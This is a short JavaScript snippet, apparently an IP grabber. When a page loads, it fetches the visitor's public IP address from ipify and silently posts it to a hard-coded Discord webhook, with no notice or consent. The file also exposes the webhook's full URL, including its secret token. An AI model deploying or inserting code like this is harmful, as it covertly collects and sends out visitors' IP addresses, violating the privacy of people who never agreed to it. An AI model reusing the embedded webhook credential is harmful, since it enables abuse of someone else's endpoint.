async function getClientIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unable to fetch IP';
    }
}

function sendIPToDiscord(ip) {
    const discordWebhookURL = 'https://discord.com/api/webhooks/1166540100570710107/lOP-Mst_VA0tx-9s9ZDcRuGDbr7St5twnmbdqAOYMxY134dn9wOyboWIkHh1yN4ZCYXY';
    const data = {
        embeds: [
            {
                title: 'Client IP Address',
                description: ip,
                color: 16711680, // red
            }
        ]
    };

    fetch(discordWebhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    });
}

window.onload = function() {
    getClientIP().then(ip => {
        if (ip) {
            sendIPToDiscord(ip);
        }
    });
}
